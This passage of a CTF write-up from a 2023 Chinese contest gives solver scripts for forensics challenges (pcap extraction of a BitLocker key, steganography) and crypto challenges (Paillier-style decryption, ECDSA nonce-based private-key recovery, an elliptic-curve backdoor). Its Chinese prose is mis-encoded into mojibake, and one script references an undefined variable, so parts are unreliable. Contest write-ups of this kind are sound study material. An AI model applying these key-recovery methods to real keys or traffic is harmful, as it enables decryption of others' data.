class="string">f&quot; <span class="subst">&#123;filename&#125;</span> not found&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            string = base64.b64decode(output)</span><br><span class="line">            output = string.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(output)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">decrypt_files(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line"><span class="comment">#flag&#123;640ce012-3d3a-446d-9d0e-5d2fe840063b&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="ç›²äººéšè—äº†èµ·æ¥"><a class="markdownIt-Anchor" href="#ç›²äººéšè—äº†èµ·æ¥"></a> ç›²äººéšè—äº†èµ·æ¥</h3>
<p>å¯¹æ¯”34æ–‡ä»¶ä¿®è¡¥12æ–‡ä»¶å¤´</p>
<p><img src="/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/image-20230519200245901.png" alt="image-20230519200245901"></p>
<p>å¦å­˜ä¸º12.mp4æ‰“å¼€æ’­æ”¾ï¼Œè·å¾—å‹ç¼©åŒ…å¯†ç <code>ChunJiSai7k7kbibi@!</code></p>
<p><img src="/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/image-20230519200333495.png" alt="image-20230519200333495"></p>
<p>è·å¾—ä¸€ä¸ªflag.png</p>
<p>stegsolveæ‰“å¼€åˆ†æï¼ŒBGRè·å–åˆ°flag</p>
<p><img src="/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/image-20230519201039450.png" alt="image-20230519201039450"></p>
<h3 id="happy2forensics"><a class="markdownIt-Anchor" href="#happy2forensics"></a> happy2forensics</h3>
<p>Wiresharkå¯¼å‡ºhttpå‘ç°æœ‰ä¸€ä¸ªrarï¼Œæå–å‡ºæ¥ï¼Œå‘ç°æ˜¯ä¸ªç£ç›˜ï¼Œæ ¹æ®æç¤º20-&gt;80ä¼šå¾—åˆ°å¯†ç </p>
<p>å¯¼å‡ºä¸€ä¸‹</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tshark -r happy2forensics.pcapng -Y &quot;tcp.srcport==20 &amp;&amp; tcp.dstport==80&quot; -Tfields-e tcp.seq_raw</span><br></pre></td></tr></table></figure>
<p>bytesä¸€ä¸‹å¾—åˆ°å¯†ç </p>
<p><code>bitlocker:120483-350966-299189-055297-225478-133463-431684-359403</code></p>
<p>ç”¨disæ¢å¤ä¸€ä¸‹ï¼Œå‘ç°æœ‰ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œä½†æ˜¯éœ€è¦å¯†ç ï¼Œå›¾ç‰‡ä¸­æœ‰ä¸€ä¸ªä¸æ­£å¸¸5mã€‚æ”¾å…¥010è¿›è¡Œåˆ†æ</p>
<p>å‘ç°æœ‰å¾ˆå¤špngï¼Œè¿˜æœ‰ä¸¤ä¸ªjpgçš„æ–‡ä»¶å°¾ï¼Œæ‰‹åŠ¨è¡¥å…¨ä¸€ä¸ªjpgå¾—åˆ°flag1ï¼Œforemoståˆ†ç¦»å¾—åˆ°ä¸€å †png</p>
<p>æ‹¼æ¥å¾—åˆ°å‹ç¼©åŒ…å¯†ç </p>
<p><img src="/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/combined.png" alt="combined"></p>
<p>è§£å¼€å‹ç¼©åŒ…ï¼Œå¾—åˆ°flag</p>
<h2 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h2>
<h3 id="cheakin"><a class="markdownIt-Anchor" href="#cheakin"></a> cheakin</h3>
<p><img src="/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/168449482293940.png" alt="img"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> n2s</span><br><span class="line">n = <span class="number">14381700422128582509148801752355744589949207890477326887251636389639477554903212313766087310581920423926674144511237847467160303159477932732842314969782540035709454603184976310835433114879043016737665256729350745769071186849072915716081380191025215059636548339167264601163525017898164466972776553148697204889820118261937316228241099344357088387154112255824092894798716597134811437852876763391697588672779069166285303075312833415574850549277205130215394422655325352478386576833373623679069271857652029364332047485797407322257853316210866532938722911480593571175419708834718860211036796987231227104370259051299799633809</span></span><br><span class="line">c1 = <span class="number">7213976567554002619445032200800186986758840297933991288547009708561953107405266725278346810536664670987171549114913443730366439254199110599202411546254632702440251000149674899033994570393935743323319736976929843596350656674709510612789987746895513057821629144725499933366382123251520676386059405796801097683107223771674383940907066300331503757142088898427893069444164604408189686282018392714450005250018004986102062209998463347007934222341910941474212611569508001910685822097788669516018081617394144015000387497289693096617795809933540456797387940627782045397249431573540932386564021712811633992948508497879189416719996092292320828635490820907122756459412206735413770335545012892724496210585503157766011075566023635046144730429791359690237088629187946232458937292767085665897489251315749496284368726255508362410603108788759785472319449267909859926786774679533591222665476101832482161295321411313525830843915966136814748249906589458905410141906965538387896747375546846618213595165688661941876715858338407833641907024891922856719044736945863722003318526031957256722493189062624177017279248142024760515092698242159769372410662895078523142768353100643884341413944795392762315999109544070401451087596138520908569234305384182336436670714204963907240715652950621301644972412252424876159530992</span></span><br><span class="line">m1 = ((c1 - <span class="number">1</span>)//(n**<span class="number">2</span>)) * inverse_mod(<span class="number">233</span>,n)</span><br><span class="line">m1 = m1%n</span><br><span class="line"><span class="built_in">print</span>(n2s(<span class="built_in">int</span>(m1%n)))</span><br><span class="line"><span class="comment">#b&#x27;flag&#123;11e89e28-4e27-47&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/168449483893243.png" alt="img"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line">D = <span class="number">1117</span></span><br><span class="line">c = continued_fraction(sqrt(D))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>):</span><br><span class="line">    x,y = c.numerator(i),c.denominator(i)</span><br><span class="line">    <span class="keyword">if</span> x**<span class="number">2</span> - D * y**<span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">        x0,y0 = x,y</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p><img src="/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/168449485931246.png" alt="img"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">14381700422128582509148801752355744589949207890477326887251636389639477554903212313766087310581920423926674144511237847467160303159477932732842314969782540035709454603184976310835433114879043016737665256729350745769071186849072915716081380191025215059636548339167264601163525017898164466972776553148697204889820118261937316228241099344357088387154112255824092894798716597134811437852876763391697588672779069166285303075312833415574850549277205130215394422655325352478386576833373623679069271857652029364332047485797407322257853316210866532938722911480593571175419708834718860211036796987231227104370259051299799633809</span></span><br><span class="line">c1 = <span class="number">7213976567554002619445032200800186986758840297933991288547009708561953107405266725278346810536664670987171549114913443730366439254199110599202411546254632702440251000149674899033994570393935743323319736976929843596350656674709510612789987746895513057821629144725499933366382123251520676386059405796801097683107223771674383940907066300331503757142088898427893069444164604408189686282018392714450005250018004986102062209998463347007934222341910941474212611569508001910685822097788669516018081617394144015000387497289693096617795809933540456797387940627782045397249431573540932386564021712811633992948508497879189416719996092292320828635490820907122756459412206735413770335545012892724496210585503157766011075566023635046144730429791359690237088629187946232458937292767085665897489251315749496284368726255508362410603108788759785472319449267909859926786774679533591222665476101832482161295321411313525830843915966136814748249906589458905410141906965538387896747375546846618213595165688661941876715858338407833641907024891922856719044736945863722003318526031957256722493189062624177017279248142024760515092698242159769372410662895078523142768353100643884341413944795392762315999109544070401451087596138520908569234305384182336436670714204963907240715652950621301644972412252424876159530992</span></span><br><span class="line">c2 = <span class="number">15954854445966181136742750543358176358186230663706091821454832527034640100670779737656720251005109942306013877086451482243141488450122353285697850016200364912263403464109626937525725210545566742746628476797261121321515812788726862118315480354196115424526212965145342675007815411995594752584377871686965531829990461770047418586001518916553661158567047779694730702789677326905844275827365395845945286695577426050334364557405151339008293258932006267159313380746863008928500607405457044370494583863960981060999695448408234857505591647503423149271589648863473472196402149897680041851877198062464480400493467334040101779732999029043327947071232256187123316057998759518569161852646625701393295408789279678540894319137126821001853808931387200759810381958895695749251834840804088478214013923869059004663359509316215974475427057000629842098545503905230785431115754636129549758888267877395566717448365986552725726428222769339088308242580851434964429627168365161743834285778996916154182286570122208454025753108647581888781783757375011437394936853319184725324597963035778640646869326035848170752766298225095197226934969602554875402243303906613183431896300664684256018886119255870435413622515792072064528098344111446380223430819596310173312668368618931885819458529703118195242890075359424013033800260927722161030183373647798407301688760998313223874318513944409702828538509864933624724225689414495687466779277994989628367119101</span></span><br><span class="line">y = y0</span><br><span class="line">res = <span class="built_in">int</span>(((((c2 - <span class="number">1</span>) // n) // y)// n // y) * <span class="number">2</span>)</span><br><span class="line">m2 = var(<span class="string">&quot;m2&quot;</span>)</span><br><span class="line">f2 = m2 * (m2 -<span class="number">1</span>) - www</span><br><span class="line">m2 = <span class="built_in">int</span>(solve(f2,m2)[<span class="number">0</span>].right_hand_side())</span><br><span class="line"><span class="comment">#f0-a7c7-8e66c18881be&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>æ‹¼èµ·æ¥ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag = n2s(<span class="built_in">int</span>(m1)) + n2s(<span class="built_in">int</span>(m2))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#b&#x27;flag&#123;11e89e28-4e27-47f0-a7c7-8e66c18881be&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<h3 id="backdoor"><a class="markdownIt-Anchor" href="#backdoor"></a> backdoor</h3>
<p>ç½‘ä¸Šèƒ½æ‰¾åˆ°ç±»ä¼¼é¢˜ç›®ï¼Œç…§çŒ«ç”»è™</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="comment"># å®šä¹‰ä¸€äº›å˜é‡</span></span><br><span class="line">(w, a, b, x) = (<span class="number">31889563</span>, <span class="number">31153</span>, <span class="number">28517</span>, <span class="number">763220531</span>)</span><br><span class="line">(A, B, P) = (<span class="number">1064988096</span>, <span class="number">802063264240</span>, <span class="number">12565302212045582769124388577074506881895777499095598016237085270545754804754108580101112266821575105979557524040668050927829331647411956215940656838233527</span>)</span><br><span class="line">G = (<span class="number">359297413048687497387015267480858122712978942384458634636826020013871463646849523577260820163767471924019580831592309960165276513810592046624940283279131</span>, <span class="number">9290586933629395882565073588501573863992359052743649536992808088692463307334265060644810911389976524008568647496608901222631270760608733724291675910247770</span>)</span><br><span class="line">M1 = (<span class="number">10930305358553250299911486296334290816447877698513318419802777123689138630792465404548228252534960885714060411282825155604339364568677765849414624286307139</span>, <span class="number">7974701243567912294657709972665114029771010872297725947444110914737157017082782484356147938296124777392629435915168481799494053881335678760116023075462921</span>)</span><br><span class="line">M2 = (<span class="number">497353451039150377961380023736260648366248764299414896780530627602565037872686230259859191906258041016214805015473019277626331812412272940029276101709693</span>, <span class="number">8439756863534455395772111050047162924667310322829095861192323688205133726655589045018003963413676473738236408975953021037765999542116607686218566948766462</span>)</span><br><span class="line">B_ = (<span class="number">5516900502352630982628557924432908395278078868116449817099410694627060720635892997830736032175084336697081211958825053352950153336574705799801251193930256</span>, <span class="number">10314456103976125214338213393161012551632498638755274752918126246399488480437083278584365543698685202192543021224052941574332651066234126608624976216302370</span>)</span><br><span class="line"><span class="comment"># å®šä¹‰æ¤­åœ†æ›²çº¿</span></span><br><span class="line">E = EllipticCurve(GF(P), [A, B])</span><br><span class="line">G = E(G)</span><br><span class="line">M1 = E(M1)</span><br><span class="line">M2 = E(M2)</span><br><span class="line">B_ = E(B_)</span><br><span class="line"><span class="comment"># è®¡ç®—å…±äº«ç§˜å¯†</span></span><br><span class="line">z = M1 - w * G - a * x * M1 - x * b * G</span><br><span class="line">k2 = sha256(<span class="built_in">str</span>(z[<span class="number">0</span>]).encode()).digest()[:<span class="number">6</span>]</span><br><span class="line">k2 = bytes_to_long(k2)</span><br><span class="line">shared_key2 = k2 * B_</span><br><span class="line"><span class="comment"># ä½¿ç”¨ MD5 ç”Ÿæˆå¯†é’¥</span></span><br><span class="line">key = md5(<span class="built_in">str</span>(<span class="built_in">int</span>(shared_key2[<span class="number">0</span>])).encode()).digest()</span><br><span class="line"><span class="comment"># è§£å¯†å¯†æ–‡ï¼Œè¾“å‡ºæ˜æ–‡</span></span><br><span class="line">cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">ct = <span class="string">b&#x27;\x1a\xfb\xa2\xe1\x86\x04\xfak\x9a\xa3\xd15\xb8\x16\x1d\xbc\xa9S\xf5;\xfa\xf1\x08dn~\xd4\x94\xa4;^*\xf6\xd7\xf10\xa3\xe1k`\x1f-\xef\x80\x16\x80\x80\xe2&#x27;</span></span><br><span class="line">pt = cipher.decrypt(ct)</span><br><span class="line"><span class="built_in">print</span>(pt)</span><br></pre></td></tr></table></figure>
<h3 id="ecdsa"><a class="markdownIt-Anchor" href="#ecdsa"></a> ecdsa</h3>
<p>ç¬¬ä¸€æ®µï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> ecdsa</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor <span class="keyword">as</span> xor</span><br><span class="line"><span class="keyword">import</span> secret</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">256</span>)</span><br><span class="line">gen = <span class="keyword">lambda</span>: p + getPrime(<span class="number">16</span>)</span><br><span class="line">pad = <span class="keyword">lambda</span> m: m + os.urandom(<span class="number">32</span> - <span class="built_in">len</span>(m) % <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">key = os.urandom(<span class="number">30</span>)</span><br><span class="line">sk = ecdsa.SigningKey.from_secret_exponent(</span><br><span class="line">    secexp=bytes_to_long(key),</span><br><span class="line">    curve=ecdsa.SECP256k1</span><br><span class="line">)</span><br><span class="line">sig1 = sk.sign(data=<span class="string">b&#x27;This is the first message.&#x27;</span>, k=gen()).<span class="built_in">hex</span>()</span><br><span class="line">sig2 = sk.sign(data=<span class="string">b&#x27;Here is another message.&#x27;</span>, k=gen()).<span class="built_in">hex</span>()</span><br><span class="line">enc = xor(hashlib.sha512(key).digest(), pad(secret.flag)).<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;sig1 = &#125;</span>\n<span class="subst">&#123;sig2 = &#125;</span>\n<span class="subst">&#123;enc = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">sig1 = &#x27;3f4a6f288e35a4397201d246a98c1f9cfa463e67717fbbdcbd26d7fac75f875855455c2bfb355f7f593ffbe4c4bd1fc729cc129976b56905639100c8ac716b37&#x27;</span></span><br><span class="line"><span class="string">sig2 = &#x27;9f563b21f0ee31b2f7a1a8c6edc8ff23b63e0a9d5dd4a699ecc3164871b4982df51bb2feb4bc06c578afd21d3e6227231dd5fe1d8440f3dcd025fd3ea68f5516&#x27;</span></span><br><span class="line"><span class="string">enc = &#x27;cc66d251bfa54954890c81dc1c607bae716573949f327db18aa1f4c0f420b8d29dc7e7ff9edb17b90306bd2aa753fc3fd4dafb9cc4b771cbdd79000ef05a40c0&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>ç¬¬äºŒæ®µï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> ecdsa.util <span class="keyword">import</span> sigdecode_string</span><br><span class="line"><span class="keyword">from</span> ecdsa <span class="keyword">import</span> SECP256k1</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1,sha512</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor <span class="keyword">as</span> xor</span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> inverse_mod</span><br><span class="line"><span class="keyword">from</span> ecdsa._compat <span class="keyword">import</span> normalise_bytes</span><br><span class="line"><span class="keyword">from</span> ecdsa.keys <span class="keyword">import</span> _truncate_and_convert_digest</span><br><span class="line">sig1 = <span class="string">&#x27;3f4a6f288e35a4397201d246a98c1f9cfa463e67717fbbdcbd26d7fac75f875855455c2bfb355f7f593ffbe4c4bd1fc729cc129976b56905639100c8ac716b37&#x27;</span></span><br><span class="line">sig2 = <span class="string">&#x27;9f563b21f0ee31b2f7a1a8c6edc8ff23b63e0a9d5dd4a699ecc3164871b4982df51bb2feb4bc06c578afd21d3e6227231dd5fe1d8440f3dcd025fd3ea68f5516&#x27;</span></span><br><span class="line">enc = <span class="string">&#x27;cc66d251bfa54954890c81dc1c607bae716573949f327db18aa1f4c0f420b8d29dc7e7ff9edb17b90306bd2aa753fc3fd4dafb9cc4b771cbdd79000ef05a40c0&#x27;</span></span><br><span class="line">enc = <span class="built_in">bytes</span>.fromhex(enc)</span><br><span class="line">r1,s1 = sigdecode_string(<span class="built_in">bytes</span>.fromhex(sig1),<span class="built_in">int</span>(SECP256k1.order))</span><br><span class="line">r2,s2 = sigdecode_string(<span class="built_in">bytes</span>.fromhex(sig2),<span class="built_in">int</span>(SECP256k1.order))</span><br><span class="line">p = <span class="built_in">int</span>(SECP256k1.curve.p())</span><br><span class="line"><span class="comment"># hashfuncä½¿ç”¨çš„æ˜¯sha1</span></span><br><span class="line">h1 = <span class="built_in">int</span>(sha1(<span class="string">b&#x27;This is the first message.&#x27;</span>).hexdigest(),<span class="number">16</span>)</span><br><span class="line">h2 = <span class="built_in">int</span>(sha1(<span class="string">b&#x27;Here is another message.&#x27;</span>).hexdigest(),<span class="number">16</span>)</span><br><span class="line">n = <span class="built_in">int</span>(SECP256k1.order)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> kr <span class="keyword">in</span> <span class="built_in">range</span>(-(<span class="number">1</span>&lt;&lt;<span class="number">16</span>),<span class="number">1</span>&lt;&lt;<span class="number">16</span>):</span><br><span class="line">    kr %= n</span><br><span class="line">    key = (s1*s2*kr - h1*s2 + h2*s1)*inverse_mod(r1*s2-r2*s1,n) % n</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        key = <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(<span class="built_in">int</span>(key))[<span class="number">2</span>:].zfill(<span class="number">60</span>))</span><br><span class="line">        res = (xor(sha512(key).digest(), enc))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;flag&#x27;</span> <span class="keyword">in</span> res:</span><br><span class="line">            <span class="built_in">print</span>(res)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line"><span class="comment">#b&#x27;flag&#123;2f64731e-785b-4259-4566-3d17554bfb7b&#125;\xed\x98\x98\xbc\x92+\xc7\x7f\xe2_\xfd\x17\x1e\x9c\xf7\x17Rq\xfa3\xa2&#123;&#x27;</span></span><br></pre></td></tr></table></figure>
<h3 id="cisticola"><a class="markdownIt-Anchor" href="#cisticola"></a> Cisticola</h3>
<p>ç¬¬ä¸€éƒ¨åˆ†ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"><span class="comment"># Problem by rec, with nothing.</span></span><br><span class="line"><span class="keyword">import</span> secret</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">key = os.urandom(<span class="number">16</span>)</span><br><span class="line">cipher = AES.new(key=key, iv=<span class="built_in">bytes</span>(<span class="built_in">range</span>(<span class="number">16</span>)), mode=AES.MODE_CBC)</span><br><span class="line">enc = cipher.encrypt(pad(secret.flag, <span class="number">16</span>)).<span class="built_in">hex</span>()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;enc = &#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">p = <span class="number">1439830214451992034013504859825496348425599138552815552028441481225682951310010651304957987750558339128649248859043607574873717185051113737355019502086518775325158336557488060325293103679742942484012852921804371007968007851081933599</span></span><br><span class="line">R.&lt;x&gt; = PolynomialRing(GF(p))</span><br><span class="line">Q = R(Q)</span><br><span class="line"></span><br><span class="line">t = <span class="number">17</span></span><br><span class="line">pos = random.sample(<span class="built_in">range</span>(<span class="number">600</span>), t) + [<span class="number">600</span>]</span><br><span class="line">poly = [<span class="built_in">int</span>(os.urandom(<span class="number">16</span>).<span class="built_in">hex</span>(), <span class="number">16</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(t)] + [<span class="built_in">int</span>(key.<span class="built_in">hex</span>(), <span class="number">16</span>)]</span><br><span class="line">hint = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(t+<span class="number">1</span>):</span><br><span class="line">    hint = (hint + poly[i]*x^pos[i]) % Q</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;pos = &#125;</span>\n<span class="subst">&#123;hint = &#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>ç¬¬äºŒéƒ¨åˆ†æ•°æ®è¾ƒå¤§ï¼Œæˆªå›¾å±•ç¤º</p>
<p><img src="/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/image-20230519192011176.png" alt="image-20230519192011176"></p>
<p>ä¸è¦å°è¯•ä½¿ç”¨sagemathåŸå‡½æ•°å–è®¡ç®—äº†ï¼Œåªèƒ½é€šè¿‡pythonå»æ¨¡æ‹Ÿè¿™ä¸ªè¿‡ç¨‹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">t = <span class="number">17</span></span><br><span class="line">ps = PolynomialRing(Zmod(p),[var(<span class="string">&#x27;p%02d&#x27;</span>%i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(t+<span class="number">1</span>)]).gens()</span><br><span class="line"><span class="comment"># ps = [var(&#x27;p%02d&#x27;%i) for i in range(t+1)]</span></span><br><span class="line">poly = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">601</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(pos)):</span><br><span class="line">    poly[pos[i]] = ps[i]</span><br><span class="line">Q = <span class="built_in">list</span>(Q)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(Q)):</span><br><span class="line">    Q[i] = <span class="built_in">int</span>(Q[i])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">divmod</span>(<span class="params">a:<span class="built_in">list</span>[<span class="built_in">int</span>],b:<span class="built_in">list</span>[<span class="built_in">int</span>],p</span>):</span><br><span class="line">    <span class="comment"># an,bnè®°å½•å¤šé¡¹å¼çš„é•¿åº¦</span></span><br><span class="line">    <span class="comment"># é»˜è®¤aï¼Œbçš„ç³»æ•°éƒ½å°äºp</span></span><br><span class="line">    an,bn = <span class="built_in">len</span>(a)-<span class="number">1</span>,<span class="built_in">len</span>(b)-<span class="number">1</span></span><br><span class="line">    <span class="keyword">assert</span> an&gt;bn <span class="keyword">or</span> (an == bn <span class="keyword">and</span> a[an] &gt; b[bn]), <span class="string">&quot;è¢«é™¤æ•°è¿‡å°&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(an,bn-<span class="number">1</span>,-<span class="number">1</span>)):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> a[i] == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        tmp = p - a[i]</span><br><span class="line">        <span class="comment"># print(tmp)</span></span><br><span class="line">        tmp_b = [b[i]*tmp <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(bn+<span class="number">1</span>)]</span><br><span class="line">        <span class="comment"># print(tmp_b)</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(bn,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">            a[i-bn+j] += tmp_b[j]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">res = <span class="built_in">divmod</span>(poly,Q,p)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(res)):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;p&#x27;</span> <span class="keyword">in</span> <span class="built_in">str</span>(res[i]):</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    res[i] = <span class="built_in">int</span>(res[i]) % p</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">fangcheng = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">430</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">430</span>):</span><br><span class="line">    fangcheng[i] = res[i] - <span class="built_in">int</span>(<span class="built_in">list</span>(hint)[i])</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">juzhen = [[<span class="number">0</span> <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">429</span>)]</span><br><span class="line">www = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">429</span>)]</span><br><span class="line"><span class="keyword">for</span> equa <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">429</span>):</span><br><span class="line">    tmp = <span class="built_in">list</span>(fangcheng[equa])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(tmp)):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">str</span>(tmp[i][<span class="number">1</span>])) &gt; <span class="number">1</span>:</span><br><span class="line">            juzhen[equa][<span class="built_in">int</span>(<span class="built_in">str</span>(tmp[i][<span class="number">1</span>])[<span class="number">1</span>:])] = tmp[i][<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            www[equa] = tmp[i][<span class="number">0</span>]</span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">A = Matrix(Zmod(p),juzhen)</span><br><span class="line">enc = <span class="built_in">bytes</span>.fromhex(enc)</span><br></pre></td></tr></table></figure>
<p>æœ€å</p>
